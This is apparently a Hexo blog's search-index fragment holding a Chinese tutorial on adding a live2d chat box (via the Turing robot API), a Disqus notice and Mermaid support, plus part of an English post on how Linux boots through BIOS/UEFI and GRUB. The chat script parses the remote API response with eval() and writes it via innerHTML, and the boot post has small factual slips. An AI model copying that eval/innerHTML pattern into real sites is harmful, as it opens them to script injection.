class=\"line\">    hitokoto: true </span><br></pre></td></tr></table></figure><br><code>hexo-helper-live2d</code>还提供了对话框，开启<code>hitokoto</code>可以间隔时间弹出随机对话框。我联想到之前做过一个聊天机器人（用的图灵机器人API），可以在这里加个输入框，做成可以交互的看伴娘。本人使用的Hexo博客是Next主题，主题位于<code>blog/themes/next</code>。</p>\n<p>首先需要创建一个输入框，在<code>next</code>的<code>layout</code>目录下创建一个<code>live2d_dialog.swig</code>的模板文件，在这里完成对话框的定制。写入HTML和CSS代码：`<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;chat_input&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;question&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;陪我聊聊天吧&quot;</span> <span class=\"attr\">onkeypress</span>=<span class=\"string\">&quot;return onKeyPress(event)&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"css\"> </span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-id\">#chat_input</span>&#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">position</span>: fixed;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">bottom</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">left</span>: <span class=\"number\">50px</span>; <span class=\"comment\">/*由于我的模型配置在左边，这里需要向左对齐*/</span></span></span><br><span class=\"line\"><span class=\"css\">&#125; </span></span><br><span class=\"line\"><span class=\"css\"></span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-id\">#question</span>&#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">border</span>: none;<span class=\"comment\">/*取消输入框边框*/</span></span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">border-bottom</span>: <span class=\"number\">1px</span> <span class=\"number\">#aaaaaa</span> solid;<span class=\"comment\">/*设置下边框*/</span></span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">background-color</span>: transparent;<span class=\"comment\">/*背景透明*/</span></span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"attribute\">padding</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"css\">&#125;</span></span><br><span class=\"line\"><span class=\"css\"></span></span><br><span class=\"line\"><span class=\"css\"><span class=\"comment\">/*手机端不显示*/</span></span></span><br><span class=\"line\"><span class=\"css\"><span class=\"keyword\">@media</span> screen <span class=\"keyword\">and</span> (<span class=\"attribute\">max-width</span>: <span class=\"number\">480px</span>) &#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-id\">#chat_input</span>&#123;</span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"attribute\">display</span>: none;</span></span><br><span class=\"line\"><span class=\"css\">    &#125;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-id\">#live2d-widget</span>&#123;</span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"attribute\">display</span>: none;</span></span><br><span class=\"line\"><span class=\"css\">    &#125;</span></span><br><span class=\"line\"><span class=\"css\">&#125;</span></span><br><span class=\"line\"><span class=\"css\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>然后是提交对话的事件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">onKeyPress</span>(<span class=\"params\">e</span>)</span>&#123; <span class=\"comment\">//在聊天框按下回车事件处理</span></span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">popDialogAndShow</span>(<span class=\"params\">message</span>) </span>&#123; <span class=\"comment\">//显示对话框</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> live2d_dialog = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">&quot;live2d-widget-dialog&quot;</span>)[<span class=\"number\">0</span>]  <span class=\"comment\">//获取对话框</span></span></span><br><span class=\"line\"><span class=\"javascript\">    live2d_dialog.style.opacity=<span class=\"number\">1</span> <span class=\"comment\">//显示对话框</span></span></span><br><span class=\"line\"><span class=\"javascript\">    live2d_dialog.innerHTML = message </span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.setTimeout(<span class=\"function\">()=&gt;</span>&#123; live2d_dialog.style.opacity = <span class=\"number\">0</span> &#125;, <span class=\"number\">10000</span>) <span class=\"comment\">//10秒后隐藏对话框 </span></span></span><br><span class=\"line\"><span class=\"javascript\">  &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">var</span> keyCode = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">if</span>(e.which) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      keyCode = e.which;</span></span><br><span class=\"line\"><span class=\"javascript\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(e.keyCode) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      keyCode = e.keyCode;</span></span><br><span class=\"line\"><span class=\"javascript\">  &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">if</span>(keyCode == <span class=\"number\">13</span>) &#123; <span class=\"comment\">//如果按下回车</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">var</span> question_box = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&#x27;question&#x27;</span>) <span class=\"comment\">// 获取输入框中的问题</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">var</span> question = question_box.value</span></span><br><span class=\"line\"><span class=\"javascript\">      question_box.value = <span class=\"string\">&quot;&quot;</span> <span class=\"comment\">//清空输入框内容并禁用输入框</span></span></span><br><span class=\"line\"><span class=\"javascript\">      question_box.setAttribute(<span class=\"string\">&quot;disabled&quot;</span>,<span class=\"string\">&quot;disabled&quot;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">var</span> api_key = <span class=\"string\">&quot;XXXXXXXXXXXXXXXXXXXXXXXX&quot;</span> <span class=\"comment\">//图灵机器人KEY,需要申请</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">var</span> url = <span class=\"string\">&#x27;https://www.tuling123.com/openapi/api?key=&#x27;</span>+api_key+<span class=\"string\">&#x27;&amp;info=&#x27;</span>+<span class=\"built_in\">encodeURIComponent</span>(question)</span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest()   <span class=\"comment\">// 通过XHR发送一个GET请求</span></span></span><br><span class=\"line\"><span class=\"javascript\">      xhr.onreadystatechange = <span class=\"function\">()=&gt;</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        question_box.removeAttribute(<span class=\"string\">&#x27;disabled&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span>(xhr.readyState === <span class=\"number\">4</span>) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (xhr.status === <span class=\"number\">200</span>) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">var</span> responseJSON = <span class=\"built_in\">eval</span>(<span class=\"string\">&#x27;(&#x27;</span>+ xhr.responseText +<span class=\"string\">&#x27;)&#x27;</span>) <span class=\"comment\">//反序列化返回的JSON</span></span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> message = (responseJSON[<span class=\"string\">&#x27;code&#x27;</span>] == <span class=\"number\">100000</span> ? responseJSON[<span class=\"string\">&#x27;text&#x27;</span>]: <span class=\"string\">&#x27;今日对话次数已用完&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            popDialogAndShow(message)</span></span><br><span class=\"line\"><span class=\"javascript\">          &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">console</span>.error(xhr.statusText);</span></span><br><span class=\"line\"><span class=\"javascript\">            popDialogAndShow(<span class=\"string\">&#x27;网络错误：&#x27;</span>+xhr.statusText)</span></span><br><span class=\"line\"><span class=\"javascript\">          &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">      &#125;;</span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">      xhr.onerror = <span class=\"function\">(<span class=\"params\">e</span>)=&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">console</span>.error(xhr.statusText);</span></span><br><span class=\"line\"><span class=\"javascript\">        popDialogAndShow(<span class=\"string\">&#x27;网络错误：&#x27;</span>+xhr.statusText)</span></span><br><span class=\"line\"><span class=\"javascript\">      &#125;;</span></span><br><span class=\"line\"><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">      xhr.open(<span class=\"string\">&#x27;GET&#x27;</span>,url)</span></span><br><span class=\"line\"><span class=\"javascript\">      xhr.send()</span></span><br><span class=\"line\"><span class=\"javascript\">  &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里使用了图灵机器人的API，可以去<a href=\"http://www.tuling123.com\">http://www.tuling123.com</a>上申请一个KEY，每天有固定免费调用次数。</p>\n<p>最后将<code>live2d_dialog.swig</code>嵌入到<code>layout</code>目录下的<code>_layout.swig</code>的末尾：<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">  &#123;%- endif %&#125;</span><br><span class=\"line\">  <span class=\"comment\">&lt;!--在此引用--&gt;</span></span><br><span class=\"line\">  &#123;% include &#x27;live2d_dialog.swig&#x27; %&#125;</span><br><span class=\"line\">  <span class=\"comment\">&lt;!--在此引用--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>启动博客看看效果：<br><img src=\"2.png\" alt=\"\"></p>\n<blockquote>\n<p>参考： <a href=\"https://www.codetool.top/article/%E7%94%A8hexo%E7%9A%84live2d%E6%8F%92%E4%BB%B6%E5%81%9A%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E8%81%8A%E5%A4%A9%E7%9A%84%E5%B0%8F%E5%AE%A0%E7%89%A9/\">用Hexo的live2d插件做了一个可以聊天的小宠物</a></p>\n</blockquote>\n<h2 id=\"优化Disqus提示\"><a href=\"#优化Disqus提示\" class=\"headerlink\" title=\"优化Disqus提示\"></a>优化Disqus提示</h2><p>我还是倾向与免费又好看的评论插件Disqus，但是它只有科学上网才能使用。为了避免天朝局域网下无法看到评论区，这里在Disqus无法加载的时候加个提示。</p>\n<p>修改<code>themes/next/scripts/filters/comment/disqus.js</code>。在<code>disqus_thread</code>的<code>div</code>里添加提示：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Add comment</span></span><br><span class=\"line\">hexo.extend.filter.register(<span class=\"string\">&#x27;theme_inject&#x27;</span>, <span class=\"function\"><span class=\"params\">injects</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> theme = hexo.theme.config;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!theme.disqus.enable || !theme.disqus.shortname) <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  injects.comment.raw(<span class=\"string\">&#x27;disqus&#x27;</span>, <span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">  &lt;div class=&quot;comments&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;div id=&quot;disqus_thread&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;blockquote&gt;&lt;b&gt;Disqus评论区没有正常加载，请使用科学上网&lt;/b&gt;&lt;/blockquote&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;noscript&gt;Please enable JavaScript to view the comments powered by Disqus.&lt;/noscript&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">  `</span>, &#123;&#125;, &#123;<span class=\"attr\">cache</span>: <span class=\"literal\">true</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  injects.bodyEnd.file(<span class=\"string\">&#x27;disqus&#x27;</span>, path.join(hexo.theme_dir, <span class=\"string\">&#x27;layout/_third-party/comments/disqus.swig&#x27;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"开启Markdown-Mermaid\"><a href=\"#开启Markdown-Mermaid\" class=\"headerlink\" title=\"开启Markdown Mermaid\"></a>开启Markdown Mermaid</h2><p>安装依赖：<code>npm install hexo-filter-mermaid-diagrams --save</code></p>\n<p>编辑<code>themes/next/_config.yaml</code>中开启mermaid并配置CDN<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Mermaid tag</span><br><span class=\"line\">mermaid:</span><br><span class=\"line\">  enable: true</span><br><span class=\"line\">  # Available themes: default | dark | forest | neutral</span><br><span class=\"line\">  theme: forest</span><br><span class=\"line\"></span><br><span class=\"line\"># CDN</span><br><span class=\"line\">vendors:</span><br><span class=\"line\">  mermaid: //cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.8/mermaid.min.js</span><br></pre></td></tr></table></figure><br>参考<a href=\"https://www.zhihu.com/question/27384681/answer/2310412196\">Hexo如何在线可视化写博客</a></p>\n<h2 id=\"开启Markdown-Flowchart\"><a href=\"#开启Markdown-Flowchart\" class=\"headerlink\" title=\"开启Markdown Flowchart\"></a>开启Markdown Flowchart</h2><p>安装依赖：<code>npm install hexo-filter-flowchart --save</code></p>\n<p>编辑<code>themes/next/_config.yaml</code>中开启mermaid并配置CDN<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flowchart:</span><br><span class=\"line\">  # raphael:   # optional, the source url of raphael.js</span><br><span class=\"line\">  # flowchart: # optional, the source url of flowchart.js</span><br><span class=\"line\">  options: # options used for `drawSVG`</span><br><span class=\"line\"></span><br><span class=\"line\"># CDN</span><br><span class=\"line\">vendors:</span><br><span class=\"line\">  mermaid: //cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.8/mermaid.min.js</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h2><p>这里汇总Hexo使用期间的一些常见问题和解决方案</p>\n<ul>\n<li>【2021/2/2】 Hexo在<code>deploy</code>后，在gitpage上无法加载Mathjax渲染公式。检查Chrome控制台发现Mathjax CDN标红：<code>blocked:mix-content</code>。这是浏览器不允许在https页面里嵌入http的请求。解决办法当然就是不要使用http请求，把网站上的http请求都迁移到https。在博文模板中找到<code>&lt;head/&gt;</code>标签<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;Content-Security-Policy&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;upgrade-insecure-requests&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>\n<li>【2021-06-18】 <code>line.MatchAll(): TypeError : undefined is not a function</code>。因为<code>line.MatchAll()</code>被最新的Hexo使用，需要将node升级到12。<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm cache clean -f <span class=\"comment\"># 清缓存</span></span><br><span class=\"line\">sudo npm install -g n <span class=\"comment\"># n模块</span></span><br><span class=\"line\">sudo n 12 <span class=\"comment\"># 安装node 12</span></span><br><span class=\"line\">node -v <span class=\"comment\"># 再次检查版本</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n","tags":["Hexo"]},{"title":"How Linux Boots","url":"/2024/02/25/How-Linux-Boots/","content":"<p>I have been wondering how operating system boots since the first time I installed my ArchLinux: What happened when I pressed the power on button? Why my computer knows where the system is installed? Why I need to run <code>grub2-install</code> and <code>grub2-mkconfig</code> from a rescue live CD when my Archlinux failed to boot after an update?</p>\n<p>It just so happens that I’m working on a requirement of <strong>Bare Metal Recovery</strong> these days. Not only do we have to restore volumes sector by sector, but also “starts up recovery” is required. We need to mount origin volumes to a Linux live CD media and run commands like <code>grub2-install</code> and <code>grub2-mkconfig</code> to fix the start up items of the origin system, otherwise the system won’t boot after BMR performed. The two commands works on most cases, however, sometimes <code>grub2-install</code> will fail, sometimes <code>grub2-mkconfig</code> will succeed but origin system still can’t boot normally after restart and only got a GRUB shell prompted instead. These strange problems on specified distro force me to delve into the booting procedure of Linux, to figure out what is GRUB, and what did these commands actually do to the disk.</p>\n<p>I will make a brief summary in this article of what I have learned these days about the os booting process, including BIOS/UEFI booting, GRUB bootloader, etc. I hope this blog might help for those who are also a newbie to such realm.</p>\n<h2 id=\"BIOS-booting-amp-UEFI-booting\"><a href=\"#BIOS-booting-amp-UEFI-booting\" class=\"headerlink\" title=\"BIOS booting &amp; UEFI booting\"></a>BIOS booting &amp; UEFI booting</h2><p>I seached from wikipedia and learned that modern computers usually have two ways for booting an operating system: <strong>BIOS (Basic Input/Output System)</strong> and <strong>UEFI (Unified Extensive Firmware Interface)</strong>. They are both firmware interfaces that are responsible for initializing hardware components during the booting process of a computer. However, they differ in several aspects:</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Aspect/Type</th>\n<th>BIOS</th>\n<th>UEFI</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Legacy vs Modern Technology</strong></td>\n<td>BIOS is the older technology, dating back to the 1970s. It has been the standard firmware interface for PCs for many years.</td>\n<td>UEFI is a more modern replacement for BIOS. It was developed to overcome limitations of BIOS and to provide more features and capabilities.</td>\n</tr>\n<tr>\n<td><strong>Boot Process</strong></td>\n<td>BIOS follows a traditional boot process where it looks for the Master Boot Record (MBR) on the boot device and executes the boot loader stored in the MBR.</td>\n<td>UEFI, on the other hand, follows a more flexible and modular boot process. It uses GUID Partition Table (GPT) instead of MBR, and it can directly execute EFI applications stored in the EFI System Partition (ESP). UEFI also supports secure boot, which ensures that only trusted software is loaded during the boot process.</td>\n</tr>\n<tr>\n<td><strong>Compatibility</strong></td>\n<td>BIOS has limited support for modern hardware features and larger storage devices. It also has compatibility issues with some advanced features like Secure Boot</td>\n<td>UEFI provides better support for modern hardware, larger storage devices, and advanced features like Secure Boot. It also supports backward compatibility with legacy BIOS systems through a compatibility support module (CSM).</td>\n</tr>\n<tr>\n<td><strong>User Interface</strong></td>\n<td>BIOS typically has a text-based user interface accessed by pressing a key (e.g., Del, F2) during system startup.</td>\n<td>UEFI often provides a graphical user interface (GUI) with mouse support for configuration and settings, making it more user-friendly.</td>\n</tr>\n<tr>\n<td><strong>Size and Extensibility</strong></td>\n<td>BIOS has a limited firmware size and functionality, making it less extensible.</td>\n<td>UEFI has a larger firmware size and is more extensible, allowing for more features and capabilities to be added.</td>\n</tr>\n</tbody>\n</table>\n</div>\n<span id=\"more\"></span>\n<h3 id=\"Bootloaders\"><a href=\"#Bootloaders\" class=\"headerlink\" title=\"Bootloaders\"></a>Bootloaders</h3><p>In summary, while both BIOS and UEFI serve the same purpose of initializing hardware during the boot process, UEFI offers several advantages over BIOS, including support for modern hardware, flexibility, security features like Secure Boot, and a more user-friendly interface.</p>\n<p>When computer powers on, bothing BIOS booting and UEFI booting won’t directly search where the operating system is, they will look for the “bootloaders” instead. A bootloader is a small program that resides in the boot sector of a storage device, such as a hard drive, solid-state drive (SSD), or a USB drive. Its primary function is to load and execute the operating system kernel to start the boot process of a computer or device.</p>\n<p>Here are some common bootloaders used in various operating systems:</p>\n<ul>\n<li>GRUB (GRand Unified Bootloader): GRUB is a widely used bootloader for Linux-based operating systems. It supports multiple operating systems and provides a boot menu for selecting the desired operating system or kernel.</li>\n<li>GRUB2: an updated version of GRUB with improved features and functionalities</li>\n<li>LILO (LInux LOader): the earliest bootloaders used for Linux systems. It has been largely replaced by GRUB but is still used in some older systems.</li>\n<li>Syslinux: a lightweight bootloader that is commonly used for booting Linux distributions from removable media, such as USB drives or CDs.</li>\n<li>Windows Boot Manager (Bootmgr): the bootloader used in Windows Vista/7/8/10. It is responsible for loading the Windows kernel and booting the Windows operating system.</li>\n<li>NTLDR (NT Loader): used in Windows NT-based operating systems, including Windows NT/2000/XP. It has been replaced by Bootmgr in newer versions of Windows.</li>\n<li>EFI/UEFI Boot Manager: UEFI includes a built-in boot manager that replaces traditional BIOS-based bootloaders. It is responsible for loading and executing EFI applications, including bootloaders for different operating systems.</li>\n</ul>\n<p>GRUB, as mentioned earlier, is well-known for Linux users. It is responsible for managing the boot process of a computer, allowing users to select which operating system to boot into when multiple operating systems are installed on the same machine at one time. Since the fact that nearly all modern Linux operating system using GRUB as the default bootloader, I will only talk about the GRUB2 in the later part, all ‘bootloader’ or ‘GRUB’ mentioned later can be viewed as ‘GRUB2’.</p>\n<p>The hardware initialization process is done by hardware maunufactor so I won’t pay much attention to this part. So firstly we need to figure out how GRUB is located and loaded. This process on BIOS mode differs from that on UEFI mode, so we have to discuss it separately.</p>\n<h3 id=\"How-BIOS-load-GRUB\"><a href=\"#How-BIOS-load-GRUB\" class=\"headerlink\" title=\"How BIOS load GRUB\"></a>How BIOS load GRUB</h3><p>If a computer use BIOS bootstrap, the BIOS will check the bootstrap signature at the MBR sector (the first sector, 512B) of the disk.</p>\n<blockquote>\n<p>read this wiki for more information about MBR : <a href=\"https://en.wikipedia.org/wiki/Master_boot_record\">https://en.wikipedia.org/wiki/Master_boot_record</a></p>\n</blockquote>\n<p>If the disk contains valid bootstrap signature, the bootstrap instruction written at the first sector will be executed. This stage is called <em>GRUB Stage 1</em>, the instruction size is limited to several hundred bytes so it’s designed only aim to load the instruction of next stage.<br><img src=\"mbr-stage1.jpg\" alt=\"mbr-stage1\"></p>\n<p>The area where the core instruction of GRUB (<code>core.img</code>) resides is known as the “embedding area” or “post-MBR gap,” is usually unpartitioned space on the disk between MBR sector and the first partition. This part is known as <em>GRUB stage 1.5</em> or <em>GRUB stage 2</em>. This is the part that need to be loaded by <em>GRUB Stage 1</em>.<br><img src=\"mbr-stage1.5.jpg\" alt=\"mbr-stage1.5\"></p>\n<blockquote>\n<p>the <code>core.img</code> is written directly to the disk using low-level disk writing utilities such as <code>dd</code>. </p>\n</blockquote>\n<p>From the <code>sfdisk -d</code> command we can see, on most modern Linux distro, the “embedding area” is reserved from 1 sector to 2047 sector, taking space about 2048 * 512B = 1MiB:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜  sudo sfdisk -d /dev/sda</span><br><span class=\"line\">label: gpt</span><br><span class=\"line\">label-id: 5B490ADF-AAFE-6441-851E-8F63D915BDBC</span><br><span class=\"line\">device: /dev/sda</span><br><span class=\"line\">unit: sectors</span><br><span class=\"line\">first-lba: 34</span><br><span class=\"line\">last-lba: 1953525134</span><br><span class=\"line\">sector-size: 512</span><br><span class=\"line\"></span><br><span class=\"line\">/dev/sda1 : start=        2048, size=     1024000, <span class=\"built_in\">type</span>=0FC63DAF-8483-4772-8E79-3D69D8477DE4, uuid=1AA2633E-44BC-3541-AA90-93D3AF1FD033</span><br><span class=\"line\">/dev/sda2 : start=     1026048, size=  1952497664, <span class=\"built_in\">type</span>=0FC63DAF-8483-4772-8E79-3D69D8477DE4, uuid=55C425F0-D00F-8341-B517-B610223183B3</span><br></pre></td></tr></table></figure>\n<p>Now, let’s go back to the question ‘what does <code>grub2-install</code> do to the disk?’. When we using <code>grub2-install -target=i386-pc /dev/sda</code> command to install GRUB, we are installing GRUB in BIOS mode. This opeation makes two modification to the disk:</p>\n<ol>\n<li>Dump GRUB core image (<em>GRUB Stage 1.5/2</em>) to “post-MBR gap” of <code>/dev/sda</code>.</li>\n<li>Write the necessary boot code and configuration data (<em>GRUB Stage 1</em>) to the MBR of <code>/dev/sda</code>.</li>\n</ol>\n<p>However, when comes to UEFI mode, all things get a little bit different.</p>\n<h3 id=\"How-UEFI-load-GRUB\"><a href=\"#How-UEFI-load-GRUB\" class=\"headerlink\" title=\"How UEFI load GRUB\"></a>How UEFI load GRUB</h3><p>If a host boots on UEFI mode, after the hardware check is done, the UEFI firmware reads specific files from the <em>EFI System Partition (ESP)</em> during the boot process. The primary file it looks for is: </p>\n<ul>\n<li><strong>Boot Loader</strong>: The UEFI firmware typically reads the boot loader file specified in the <em>boot configuration data (BCD)</em> or in the firmware’s boot manager settings. The boot loader file is usually located at <code>/EFI/BOOT/bootx64.efi</code> for 64-bit systems or <code>/EFI/BOOT/bootia32.efi</code> for 32-bit systems. This file is responsible for initiating the boot process and loading the operating system kernel.</li>\n</ul>\n<p>Additionally, the UEFI firmware may read other files from the ESP depending on the system configuration and boot options. These files may include:</p>\n<ul>\n<li><strong>Boot Manager Configuration</strong>: Configuration files related to the UEFI boot manager, such as <code>/EFI/Microsoft/Boot/BCD</code> or <code>/EFI/Boot/BCD</code>.</li>\n<li><strong>Operating System Boot Loader</strong>: The boot loader for the specific operating system installed on the system, located at paths like <code>/EFI/&lt;Operating_System&gt;/bootx64.efi</code>.</li>\n</ul>\n<p>The <strong>EFI System Partition (ESP)</strong> is an independent partition on a disk, typically formatted with the FAT32 file system. It’s used by computers adhering to the UEFI specification for storing boot loader and other system files required for the boot process. The ESP is usually mounted at <code>/boot/efi</code> in Linux systems and contains files necessary for the boot process, such as boot loaders, boot manager configurations, and firmware executables. For example, structure of an ESP partition of Ubuntu mounted at <code>/boot/efi</code> may looks like :<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">├── EFI</span><br><span class=\"line\">│   ├── ubuntu</span><br><span class=\"line\">│   │   ├── bootx64.efi</span><br><span class=\"line\">│   │   ├── fonts</span><br><span class=\"line\">│   │   │   ├── TRANS.TBL</span><br><span class=\"line\">│   │   │   └── unicode.pf2</span><br><span class=\"line\">│   │   ├── grub.cfg</span><br><span class=\"line\">│   │   ├── grubx64.efi</span><br><span class=\"line\">│   │   ├── mmx64.efi</span><br><span class=\"line\">│   │   └── TRANS.TBL</span><br><span class=\"line\">│   └── TRANS.TBL</span><br></pre></td></tr></table></figure></p>\n<p>In this case, UEFI booting process may looks like this:</p>\n<ol>\n<li>UEFI firmware search all FAT32 partitions on disks partitioned by GPT and find a valid ESP</li>\n<li>UEFI firmware found the bootloader <code>/EFI/ubuntu/bootx64.efi</code> in this ESP and load it into memory</li>\n<li>The UEFI bootloader <code>/EFI/ubuntu/bootx64.efi</code> load GRUB executable <code>/EFI/ubuntu/grubx64.efi</code></li>\n</ol>\n<p>the <code>grub2-install</code> command to install GRUB in UEFI mode should be like <code>grub2-install --target=x86_64-efi --efi-directory=/boot/efi</code>. This command installs the GRUB bootloader onto the EFI System Partition (ESP) of your disk. You need to sepecify a directory, or say ESP mount point, as a target to store the UEFI loader files rather than provide a block device like <code>/dev/sda</code>.</p>\n<blockquote>\n<p>According to the UEFI specification, a disk should only contain one EFI System Partition (ESP). The ESP is a unique partition designated for storing boot loaders and other essential boot files for the UEFI boot process. Having multiple ESPs on a single disk could lead to confusion for the UEFI firmware and the boot manager, as they rely on a single ESP to locate and load the necessary boot files. Therefore, it’s recommended to have only one ESP per disk when using UEFI booting. However, a PC may allowed to contain multiple ESP partition by having multiple disks each containing a valid ESP, the firmware determines which disk to boot from based on the boot order settings configured in the UEFI firmware. </p>\n</blockquote>\n<h2 id=\"How-GRUB-boot-Linux\"><a href=\"#How-GRUB-boot-Linux\" class=\"headerlink\" title=\"How GRUB boot Linux\"></a>How GRUB boot Linux</h2><p>When GRUB is loaded by BIOS/UEFI firmware, it takes the control and we don’t need to care the difference between BIOS booting and UEFI booting from now on.</p>\n<p>GRUB can provide both a text-based menu and a GUI based, prettfied UI for user to select which boot option to use:<br><img src=\"boot-into-recovery-mode-ubuntu-1.jpg\" alt=\"boot-into-recovery-mode-ubuntu\"></p>\n<p><img 